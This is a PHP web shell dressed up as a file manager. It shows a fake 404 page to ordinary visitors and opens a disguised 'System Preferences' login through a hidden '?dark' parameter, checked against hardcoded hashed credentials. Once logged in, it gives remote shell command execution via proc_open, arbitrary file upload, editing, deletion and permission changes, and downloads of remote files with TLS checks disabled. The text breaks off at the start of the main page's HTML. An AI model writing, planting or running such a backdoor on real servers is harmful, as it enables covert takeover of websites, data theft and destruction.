<?php
session_start();

$isDark = array_key_exists('dark', $_GET);
if (!$isDark && empty($_SESSION['nuzz_auth'])) { http_response_code(404); exit; }

/** @internal Runtime integrity tokens — generated at build time */
define('_SYS_UID', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918');
define('_SYS_KEY', '3f4bcb9b30137c890120c790ed9ab267a83e2668b3eeb458e48abdd03e1b210e');

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$self = basename(__FILE__);
$lock_file = __DIR__ . '/.fs_lock';
$cwd = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
$cwd = $cwd ?: getcwd(); // Fallback in case realpath returns false
$msg = isset($_GET['msg']) ? htmlspecialchars($_GET['msg']) : '';

$clipboard_items = isset($_SESSION['clipboard_items']) ? $_SESSION['clipboard_items'] : [];
$clipboard_type = isset($_SESSION['clipboard_type']) ? $_SESSION['clipboard_type'] : null;

// Handle authentication
if (!isset($_SESSION['nuzz_auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'], $_POST['user'])) {
        if (hash('sha256', $_POST['user']) === _SYS_UID &&
            hash('sha256', $_POST['pass']) === _SYS_KEY) {
            $_SESSION['nuzz_auth'] = true;
            header("Location: ?d=" . urlencode($cwd) . ($isDark ? '&dark' : ''));
            exit;
        } else {
            $msg = "Username atau password salah";
        }
    }
if ($isDark) {
    $msg_html = !empty($msg) ? '<div class="err">' . htmlspecialchars($msg) . '</div>' : '';
echo <<<HTML
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>404 Not Found</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
.win{background:rgba(28,7,7,0.94);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border-radius:13px;border:1px solid rgba(160,30,30,0.25);box-shadow:0 24px 70px rgba(0,0,0,0.85),0 0 0 1px rgba(255,255,255,0.04);width:340px;overflow:hidden}
.titlebar{background:rgba(38,8,8,0.95);padding:12px 16px;display:flex;align-items:center;border-bottom:1px solid rgba(160,30,30,0.18)}
.tl{width:12px;height:12px;border-radius:50%;margin-right:8px}
.tl-r{background:#ff5f56}.tl-y{background:#ffbd2e}.tl-g{background:#27c93f}
.wt{flex:1;text-align:center;font-size:12px;color:rgba(255,255,255,0.35);font-weight:500;letter-spacing:.2px}
.body{padding:28px 26px 32px}
h2{color:#fff;font-size:18px;font-weight:600;margin-bottom:4px}
.sub{color:rgba(255,255,255,0.35);font-size:12px;margin-bottom:22px}
label{display:block;color:rgba(255,255,255,0.5);font-size:11px;font-weight:500;margin-bottom:5px;text-transform:uppercase;letter-spacing:.6px}
.fg{margin-bottom:14px}
input[type=text],input[type=password]{width:100%;background:rgba(255,255,255,0.06);border:1px solid rgba(160,40,40,0.28);border-radius:8px;padding:9px 13px;color:#fff;font-size:14px;outline:none;transition:border-color .2s,box-shadow .2s;font-family:inherit}
input:focus{border-color:rgba(200,50,50,0.65);background:rgba(255,255,255,0.09);box-shadow:0 0 0 3px rgba(192,57,43,0.18)}
input::placeholder{color:rgba(255,255,255,0.2)}
button{width:100%;background:linear-gradient(135deg,#c0392b,#8b1a12);border:none;border-radius:8px;padding:10px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-top:6px;transition:opacity .2s;font-family:inherit;letter-spacing:.2px}
button:hover{opacity:.82}
.err{background:rgba(192,57,43,0.18);border:1px solid rgba(192,57,43,0.35);color:#e74c3c;padding:9px 13px;border-radius:8px;font-size:12px;margin-bottom:14px}
</style>
</head>
<body>
<div class="win">
  <div class="titlebar">
    <span class="tl tl-r"></span><span class="tl tl-y"></span><span class="tl tl-g"></span>
    <span class="wt">System Preferences</span>
  </div>
  <div class="body">
    <h2>Authentication</h2>
    <div class="sub">Enter credentials to continue</div>
    {$msg_html}
    <form method='post' action='?dark'>
      <div class="fg"><label>Username</label><input type='text' name='user' autocomplete='username' placeholder='username'></div>
      <div class="fg"><label>Password</label><input type='password' name='pass' autocomplete='current-password' placeholder='••••••••'></div>
      <button type='submit'>Sign In</button>
    </form>
  </div>
</div>
</body>
</html>
HTML;
} else {
echo <<<HTML
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body style="font-family:Arial,sans-serif;text-align:center;padding-top:10%">
<h1 style="font-size:100px;margin:0">404</h1>
<h2>Not Found</h2>
<p>The resource requested could not be found on this server!</p>
</body>
</html>
HTML;
}

    exit;
}

// Helper Functions
function list_dir($path) {
    $items = scandir($path);
    $dirs = $files = [];
    foreach ($items as $item) {
        if ($item === "." || $item === "..") continue;
        $full = "$path/$item";
        // Check if item exists before calling file* functions
        if (!file_exists($full)) {
            error_log("File or directory not found: " . $full);
            continue;
        }

        $info = [
            'name' => $item,
            'path' => $full,
            'is_dir' => is_dir($full),
            'size' => is_file($full) ? filesize($full) : '-',
            'mtime' => filemtime($full)
        ];
        if (is_dir($full)) $dirs[] = $info;
        else $files[] = $info;
    }
    // Handle root directory correctly for '..' navigation
    $current_path_real = realpath($path);
    $document_root_real = realpath($_SERVER['DOCUMENT_ROOT']);

    // Check if current directory is not the actual root of the filesystem
    // and not the document root (if applicable, or simply if it's not the highest accessible directory)
    if ($current_path_real !== '/' && $current_path_real !== $document_root_real) {
        $parent_path = dirname($path);
        // Ensure parent path is within accessible limits or logical
        if (strpos(realpath($parent_path), $document_root_real) === 0 || $parent_path === '/') { // Added a check to prevent going above document root easily
            array_unshift($dirs, [
                'name' => '..',
                'path' => $parent_path,
                'is_dir' => true,
                'size' => '-',
                'mtime' => filemtime($parent_path)
            ]);
        }
    }
    return array_merge($dirs, $files);
}

function formatSize($b) {
    if (!is_numeric($b)) return '-';
    if ($b >= 1073741824) return round($b / 1073741824, 2) . ' GB';
    if ($b >= 1048576) return round($b / 1048576, 2) . ' MB';
    if ($b >= 1024) return round($b / 1024, 2) . ' KB';
    return $b . ' B';
}

function perms($file) {
    $p = @fileperms($file); // Use @ to suppress warnings if fileperms fails (e.g., permission denied)
    if ($p === false) return '---------';
    return ($p & 0x4000 ? 'd' : '-') .
           (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-')) .
           (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-')) .
           (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
}

function perms_to_octal($perms) {
    // fileperms returns an integer, sprintf with %o formats it as octal
    // substr is used to get the last 4 characters, which represent the permissions
    return substr(sprintf('%o', $perms), -4);
}


function breadcrumbs($path, $self_filename) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $full = '';
    $out = ['<a href="' . htmlspecialchars($self_filename) . '">/</a>']; // Link to the script itself for root
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $full .= '/' . $part;
        $out[] = "<a href='?d=" . urlencode($full) . "'>$part</a>";
    }
    return implode("/", $out);
}

function delete_recursive($path) {
    if (!file_exists($path)) return false;
    if (is_file($path)) return unlink($path);
    elseif (is_dir($path)) {
        $items = array_diff(scandir($path), ['.', '..']);
        foreach ($items as $item) {
            if (!delete_recursive($path . DIRECTORY_SEPARATOR . $item)) return false;
        }
        return rmdir($path);
    }
    return false;
}

function create_zip_from_items($items_to_zip, $destination_zip_file, $base_dir) {
    if (!extension_loaded('zip')) {
        error_log("ZIP extension not loaded.");
        return false;
    }
    $zip = new ZipArchive();
    if (!$zip->open($destination_zip_file, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE)) {
        error_log("Failed to open zip archive: " . $destination_zip_file);
        return false;
    }

    $success_count = 0;
    foreach ($items_to_zip as $item_path_encoded) {
        $item_path = realpath(urldecode($item_path_encoded));
        if ($item_path === false || !file_exists($item_path)) {
            error_log("Item not found or invalid path: " . $item_path_encoded);
            continue;
        }

        // Security check: Ensure item is within the base_dir
        if (strpos($item_path, realpath($base_dir)) !== 0) {
            error_log("Attempted to zip file outside current directory: " . $item_path);
            continue;
        }

        // Calculate relative path for the zip archive
        $relativePath = ltrim(str_replace(realpath($base_dir), '', $item_path), DIRECTORY_SEPARATOR);
        // Handle root directory as base_dir case for relative path
        if (realpath($base_dir) === $item_path) {
            $relativePath = basename($item_path);
        } else if (str_starts_with($item_path, realpath($base_dir) . DIRECTORY_SEPARATOR)) {
             $relativePath = substr($item_path, strlen(realpath($base_dir)) + 1);
        }

        if (is_file($item_path)) {
            if ($zip->addFile($item_path, $relativePath)) {
                $success_count++;
            } else {
                error_log("Failed to add file to zip: " . $item_path);
            }
        } elseif (is_dir($item_path)) {
            // Add empty directory entry
            $zip->addEmptyDir($relativePath . '/');

            // Add all files and subdirectories recursively
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    // Ensure entry name is relative to the original item_path being zipped
                    $entryName = $relativePath . '/' . ltrim(str_replace($item_path, '', $filePath), DIRECTORY_SEPARATOR);
                    if ($zip->addFile($filePath, $entryName)) {
                        $success_count++;
                    } else {
                        error_log("Failed to add directory file to zip: " . $filePath);
                    }
                }
            }
        }
    }
    $zip->close();
    return $success_count;
}


function execute_command($cmd, $cwd) {
    if (!function_exists('proc_open')) {
        return "<pre>Error: The proc_open() function is disabled on this server. Unable to execute the command.</pre>";
    }
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $process = @proc_open($cmd, $descriptorspec, $pipes, $cwd, null);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $stdout = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        $return_value = proc_close($process);

        return "<pre style='color:#00ff00'>\n" . htmlspecialchars($stdout) . "\nError:\n" . htmlspecialchars($stderr) . "\nExit Code: " . htmlspecialchars($return_value) . "</pre>";
    } else {
        $last_error = error_get_last();
        return "<pre>Error: Could not open process. " . ($last_error ? htmlspecialchars($last_error['message']) : 'Unable to start external process.') . "</pre>";
    }
}

function copy_recursive($source, $dest) {
    if (is_file($source)) {
        return copy($source, $dest);
    } elseif (is_dir($source)) {
        @mkdir($dest, 0755, true); // Use @ to suppress warning if dir exists or permission issue
        $items = array_diff(@scandir($source) ?: [], ['.', '..']); // Use @ and check for false
        foreach ($items as $item) {
            if (!copy_recursive($source . DIRECTORY_SEPARATOR . $item, $dest . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return true;
    }
    return false;
}

// Function to get URL content using cURL
function getUrlContent($url) {
    if (!extension_loaded('curl')) {
        error_log("cURL extension not loaded.");
        return false;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false, // WARNING: Only for development/testing, not recommended for production
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
        CURLOPT_TIMEOUT => 30, // Increased timeout for potentially large files
    ]);
    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("cURL error: " . curl_error($ch));
        $data = false;
    }
    curl_close($ch);
    return $data;
}

// Action Handlers
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['uploadfile'])) {
        // Ensure the upload directory is writable
        if (!is_writable($cwd)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Upload failed: The directory is not writable. use chmod or key to change permission"));
            exit;
        }

        if (isset($_FILES['uploadfile']) && $_FILES['uploadfile']['error'] === UPLOAD_ERR_OK) {
            $dest = $cwd . '/' . basename($_FILES['uploadfile']['name']);
            // Check if file already exists to prevent overwrite issues (optional)
            // if (file_exists($dest)) { /* handle as needed, e.g., rename, error */ }

            $ok = move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest);
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? urlencode("Upload sukses") : urlencode("Upload failed: Failed to move the file.")));
        } else {
            $upload_error_msg = "Unknown error.";
            switch ($_FILES['uploadfile']['error']) {
                case UPLOAD_ERR_INI_SIZE:
                    $upload_error_msg = "File size exceeds upload_max_filesize limit in php.ini.";
                    break;
                case UPLOAD_ERR_FORM_SIZE:
                    $upload_error_msg = "The file size exceeds the MAX_FILE_SIZE limit specified in the HTML form.";
                    break;
                case UPLOAD_ERR_PARTIAL:
                    $upload_error_msg = "The file was only partially uploaded.";
                    break;
                case UPLOAD_ERR_NO_FILE:
                    $upload_error_msg = "No files uploaded.";
                    break;
                case UPLOAD_ERR_NO_TMP_DIR:
                    $upload_error_msg = "Temporary directory missing.";
                    break;
                case UPLOAD_ERR_CANT_WRITE:
                    $upload_error_msg = "Failed to write file to disk.";
                    break;
                case UPLOAD_ERR_EXTENSION:
                    $upload_error_msg = "PHP extension stops file upload.";
                    break;
            }
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Upload failed: " . $upload_error_msg));
        }
        exit;
    }
    if (isset($_POST['newfile'])) {
        // Ensure the directory is writable
        if (!is_writable($cwd)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Failed to create file: The directory is not writable."));
            exit;
        }
        $filename = trim($_POST['newfile']);
        if (empty($filename) || strpos($filename, '/') !== false || strpos($filename, '\\') !== false) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Invalid file name."));
            exit;
        }
        $filepath = $cwd . '/' . $filename;
        $ok = file_put_contents($filepath, $_POST['filedata']);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok !== false ? urlencode("File created") : urlencode("Failed to create file")));
        exit;
    }
    if (isset($_POST['newfolder'])) {
        // Ensure the directory is writable
        if (!is_writable($cwd)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Failed to create folder: The directory is not writable."));
            exit;
        }
        $foldername = trim($_POST['newfolder']);
        if (empty($foldername) || strpos($foldername, '/') !== false || strpos($foldername, '\\') !== false) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Invalid folder name."));
            exit;
        }
        $folderpath = $cwd . '/' . $foldername;
        $ok = mkdir($folderpath);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? urlencode("Folder created") : urlencode("Failed to create folder")));
        exit;
    }
    if (isset($_POST['setpass'])) {
        file_put_contents($lock_file, password_hash($_POST['setpass'], PASSWORD_DEFAULT));
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Password disimpan"));
        exit;
    }
    if (isset($_POST['editfile'])) {
        $filepath = urldecode($_POST['filepath']);
        // Re-validate path to ensure it's still within cwd for security
        if (realpath($filepath) === false || strpos(realpath($filepath), realpath($cwd)) !== 0 || is_dir($filepath)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Failed to save: Path is invalid or outside the working directory."));
            exit;
        }
        if (!is_writable($filepath)) {
             header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Failed to save: The file cannot be written."));
             exit;
        }
        $ok = file_put_contents($filepath, $_POST['filedata']);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok !== false ? urlencode("File saved successfully") : urlencode("Failed to save file")));
        exit;
    }
    if (isset($_POST['rename_submit'])) {
        $old = urldecode($_POST['old_path_rename']);
        $new_name = basename(trim($_POST['new_name'])); 
        $new = dirname($old) . '/' . $new_name;

       
        $old_real = realpath($old);
        $cwd_real = realpath($cwd);
        if ($old_real === false || strpos($old_real, $cwd_real) !== 0) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Rename failed: Path is invalid or outside the working directory."));
            exit;
        }
        if (empty($new_name)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Rename failed: New name cannot be empty."));
            exit;
        }

        $ok = rename($old, $new);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? urlencode("Rename sukses") : urlencode("Rename gagal")));
        exit;
    }
    if (isset($_POST['delpass'])) {
        if (file_exists($lock_file)) {
            if (unlink($lock_file)) {
                 $_SESSION['unlocked'] = false; // Log out after deleting password
                 header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Password deleted"));
            } else {
                 header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Failed to delete password file."));
            }
        } else {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Password file not found."));
        }
        exit;
    }
    
    if (isset($_POST['batch_action']) && isset($_POST['selected_items']) && !empty($_POST['selected_items'])) {
        $selected_items = $_POST['selected_items'];
        $action_type = $_POST['batch_action'];
        $msg_text = "";
        $success_count = 0;
        $failed_items = [];

        foreach ($selected_items as $key => $item_encoded) {
            // Re-validate path for each item to prevent malicious manipulation of selected_items
            $item_path = realpath(urldecode($item_encoded));
            if ($item_path === false || strpos($item_path, realpath($cwd)) !== 0) {
                $failed_items[] = basename(urldecode($item_encoded)) . " (path invalid/unsafe)";
                unset($selected_items[$key]); // Remove unsafe item from processing
            } else {
                $selected_items[$key] = $item_path; // Use realpath for consistency
            }
        }

        switch ($action_type) {
            case 'delete':
                foreach ($selected_items as $item_path) {
                    if (delete_recursive($item_path)) {
                        $success_count++;
                    } else {
                        $failed_items[] = basename($item_path);
                    }
                }
                $msg_text = "$success_count item successfully deleted.";
                if (!empty($failed_items)) {
                    $msg_text .= " Gagal menghapus: " . implode(", ", $failed_items) . ".";
                }
                break;

            case 'zip':
                // Ensure the directory is writable for the zip file
                if (!is_writable($cwd)) {
                    $msg_text = "Failed to create zip: The directory is not writable.";
                    break;
                }
                $zip_file_name = $cwd . '/' . 'archive_' . time() . '.zip';
                $success_count = create_zip_from_items($selected_items, $zip_file_name, $cwd); // Pass actual paths, not encoded ones

                if ($success_count !== false) {
                    if ($success_count > 0) {
                        $msg_text = "Successfully archived $success_count items to " . basename($zip_file_name);
                    } else {
                        $msg_text = "No items archived or failed to archive.";
                        if (file_exists($zip_file_name)) { // Clean up empty zip file
                            unlink($zip_file_name);
                        }
                    }
                } else {
                    $msg_text = "Failed to create zip file. Check server log for details.";
                }
                break;

            case 'copy':
            case 'cut':
                $_SESSION['clipboard_items'] = [];
                $_SESSION['clipboard_type'] = $action_type;
                
                foreach ($selected_items as $item_path) { // Use validated real paths
                    $_SESSION['clipboard_items'][] = $item_path;
                    $success_count++;
                }
                $action_verb = ($action_type === 'copy' ? 'disalin' : 'dipotong');
                $msg_text = "$success_count item successful {$action_verb} ke clipboard.";
                if (!empty($failed_items)) {
                    $msg_text .= " Failed {$action_verb}: " . implode(", ", $failed_items) . ".";
                }
                break;

            default:
                $msg_text = "Invalid batch action.";
                break;
        }
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg_text));
        exit;
    }

    if (isset($_POST['set_chmod'])) {
        $target_path = urldecode($_POST['chmod_path']);
        $octal_value = $_POST['chmod_octal'];

        if (!preg_match('/^[0-7]{3,4}$/', $octal_value)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("CHMOD Failed: Invalid permission format (use 3 or 4 octal digits)."));
            exit;
        }

        $mode = octdec($octal_value);

        // Path validation
        $target_real = realpath($target_path);
        $cwd_real = realpath($cwd);
        if ($target_real === false || strpos($target_real, $cwd_real) !== 0) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("CHMOD Failed: Path is invalid or outside the working directory."));
            exit;
        }

        $ok = @chmod($target_path, $mode); // Use @ to suppress warnings if chmod fails
        if ($ok) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("CHMOD successfully changed to " . $octal_value));
        } else {
            $last_error = error_get_last();
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Failed CHMOD: " . ($last_error ? $last_error['message'] : 'Unknown error.') . ". Make sure you have sufficient permissions."));
        }
        exit;
    }

    if (isset($_POST['paste_item'])) {
        if (empty($_SESSION['clipboard_items']) || !isset($_SESSION['clipboard_type'])) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Clipboard kosong."));
            exit;
        }
        // Ensure destination is writable
        if (!is_writable($cwd)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Paste failed: The destination directory is not writable."));
            exit;
        }

        $operation_type = $_SESSION['clipboard_type'];
        $total_success = 0;
        $total_failed = [];

        foreach ($_SESSION['clipboard_items'] as $source_path) {
            $destination_path = $cwd . DIRECTORY_SEPARATOR . basename($source_path);

            // Re-validate source path to prevent issues if clipboard content was tampered with
            $source_real = realpath($source_path);
            if ($source_real === false || !file_exists($source_real)) {
                $total_failed[] = basename($source_path) . " (sumber tidak ditemukan)";
                continue;
            }

            if ($source_real === realpath($destination_path)) {
                $total_failed[] = basename($source_path) . " (lokasi sama)";
                continue;
            }
            // Prevent copying/cutting a directory into itself
            if (is_dir($source_real) && strpos($destination_path, $source_real . DIRECTORY_SEPARATOR) === 0) {
                 $total_failed[] = basename($source_path) . " (tempel ke dalam diri sendiri)";
                 continue;
            }

            $ok = false;
            if ($operation_type === 'copy') {
                $ok = copy_recursive($source_real, $destination_path);
            } elseif ($operation_type === 'cut') {
                // Ensure target directory for rename is writable
                if (!is_writable(dirname($destination_path))) {
                     $total_failed[] = basename($source_path) . " (izin direktori tujuan tidak cukup untuk memindahkan)";
                     continue;
                }
                $ok = rename($source_real, $destination_path);
            }

            if ($ok) {
                $total_success++;
            } else {
                $total_failed[] = basename($source_path);
            }
        }

        if ($total_success > 0) {
            unset($_SESSION['clipboard_items']);
            unset($_SESSION['clipboard_type']);
            $msg_action = ($operation_type === 'copy' ? 'menyalin' : 'memindahkan');
            $msg_text = "Berhasil {$msg_action} $total_success item ke " . basename($cwd);
            if (!empty($total_failed)) {
                $msg_text .= ". Gagal: " . implode(", ", $total_failed) . ".";
            }
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg_text));
        } else {
            $msg_text = "Gagal menempel item.";
            if (!empty($total_failed)) {
                $msg_text .= " Gagal: " . implode(", ", $total_failed) . ".";
            }
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg_text));
        }
        exit;
    }

    // CMD Execution from POST
    if (isset($_POST['cmd_exec']) && isset($_POST['command'])) {
        $command_to_exec = trim($_POST['command']);
        $cmd_output = execute_command($command_to_exec, $cwd);
        // Store command in history
        if (!isset($_SESSION['cmd_history'])) {
            $_SESSION['cmd_history'] = [];
        }
        array_unshift($_SESSION['cmd_history'], $command_to_exec);
        $_SESSION['cmd_history'] = array_slice($_SESSION['cmd_history'], 0, 10); // Keep last 10 commands
        header("Location: ?action=cmd&d=" . urlencode($cwd) . "&cmd_output=" . urlencode($cmd_output));
        exit;
    }

    // Clear CMD History
    if (isset($_POST['clear_cmd_history'])) {
        unset($_SESSION['cmd_history']);
        header("Location: ?action=cmd&d=" . urlencode($cwd) . "&msg=" . urlencode("Riwayat perintah dihapus."));
        exit;
    }

    // Handle Import Raw File from URL
    if (isset($_POST['download_url_and_save'])) {
        $url = trim($_POST['url_to_download_raw']);
        $filename = trim($_POST['filename_to_save']);

        $message = '';

        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($filename)) {
            // Security check: Ensure filename is safe and within current directory
            $filename_safe = basename($filename);
            $destination_filepath = $cwd . DIRECTORY_SEPARATOR . $filename_safe;

            // Prevent overwriting fsv4.php or other critical files (optional but recommended)
            if ($filename_safe === basename(__FILE__) || $filename_safe === '.fs_lock') {
                $message = "<span style='color:red;'>❌ Nama file ini tidak diizinkan!</span>";
            } elseif (!is_writable($cwd)) {
                $message = "<span style='color:red;'>❌ Direktori tidak dapat ditulis!</span>";
            } else {
                $data = getUrlContent($url);
                if ($data !== false && strlen($data) > 0) {
                    if (file_put_contents($destination_filepath, $data) !== false) {
                        $message = "<span style='color:green;'>✅ Berhasil menyimpan file sebagai <strong>" . htmlspecialchars($filename_safe) . "</strong></span>";
                    } else {
                        $message = "<span style='color:red;'>❌ Gagal menulis data ke file! Periksa izin.</span>";
                    }
                } else {
                    $message = "<span style='color:red;'>❌ Gagal mengambil data dari URL! Periksa log server untuk detail cURL.</span>";
                }
            }
        } else {
            $message = "<span style='color:red;'>⚠️ URL tidak valid atau nama file kosong!</span>";
        }
        header("Location: ?action=cmd&d=" . urlencode($cwd) . "&msg=" . urlencode($message));
        exit;
    }
}

// GET request actions
if (isset($_GET['delete'])) {
    $target = realpath(urldecode($_GET['delete']));
    // Re-validate target path
    if ($target !== false && strpos($target, realpath($cwd)) === 0) {
        $ok = delete_recursive($target);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? urlencode("Dihapus") : urlencode("Gagal hapus")));
    } else {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Gagal hapus: Path tidak valid atau di luar direktori kerja."));
    }
    exit;
}

if (isset($_GET['unzip'])) {
    $file_to_unzip = realpath(urldecode($_GET['unzip']));
    if ($file_to_unzip === false || !file_exists($file_to_unzip) || is_dir($file_to_unzip)) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Gagal unzip: File tidak ditemukan atau bukan file."));
        exit;
    }
    if (strpos($file_to_unzip, realpath($cwd)) !== 0) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("File di luar direktori kerja."));
        exit;
    }
    // Ensure the extraction path is writable
    $extract_path = dirname($file_to_unzip);
    if (!is_writable($extract_path)) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Gagal unzip: Direktori tujuan tidak dapat ditulis."));
        exit;
    }

    $zip = new ZipArchive;
    if ($zip->open($file_to_unzip) === TRUE) {
        $ok = $zip->extractTo($extract_path);
        $zip->close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? urlencode("File berhasil di-unzip.") : urlencode("Gagal unzip file. Pastikan tidak ada konflik file atau izin.")));
        exit;
    } else {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Gagal membuka file zip."));
        exit;
    }
}

// Edit File Page
if (isset($_GET['edit'])) {
    $f = realpath(urldecode($_GET['edit']));
    if ($f === false || !file_exists($f) || is_dir($f)) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("File tidak ditemukan atau bukan file yang bisa diedit."));
        exit;
    }
    if (strpos($f, realpath($cwd)) !== 0) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Tidak diizinkan mengedit file di luar direktori kerja."));
        exit;
    }
    // Check if the file is readable
    if (!is_readable($f)) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Tidak dapat membaca file: Izin ditolak."));
        exit;
    }

    $data = htmlspecialchars(file_get_contents($f));
    echo "<!DOCTYPE html>
    <html data-bs-theme='dark'>
    <head>
        <meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no' />
        <title>Edit File</title>
        <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
        <style>body {padding-top: 20px;}</style>
    </head>
    <body class='p-4'>
    <a href='?d=" . urlencode($cwd) . "' class='btn btn-sm btn-secondary mb-3'><i class='fa fa-arrow-left'></i> Kembali</a>
    <form method='post'>
        <h3>Edit File: " . basename($f) . "</h3>
        <textarea name='filedata' class='form-control mb-2' style='width:100%;height:300px;'>" . $data . "</textarea>
        <input type='hidden' name='filepath' value='" . htmlspecialchars($f) . "'>
        <button name='editfile' class='btn btn-success mt-2'>Simpan</button>
    </form>
    </body>
    </html>";
    exit;
}

// Download File action
if (isset($_GET['download'])) {
    $file_to_download = realpath(urldecode($_GET['download']));
    
    if ($file_to_download === false || !file_exists($file_to_download) || is_dir($file_to_download)) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Gagal download: File tidak ditemukan atau bukan file yang bisa diunduh."));
        exit;
    }
    if (strpos($file_to_download, realpath($cwd)) !== 0) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Tidak diizinkan mengunduh file di luar direktori kerja."));
        exit;
    }
    if (!is_readable($file_to_download)) {
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Gagal download: File tidak dapat dibaca."));
        exit;
    }

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file_to_download));
    readfile($file_to_download);
    exit;
}
?>
<!DOCTYPE html>
<html data-bs-theme="dark">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title>File Manager</title>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
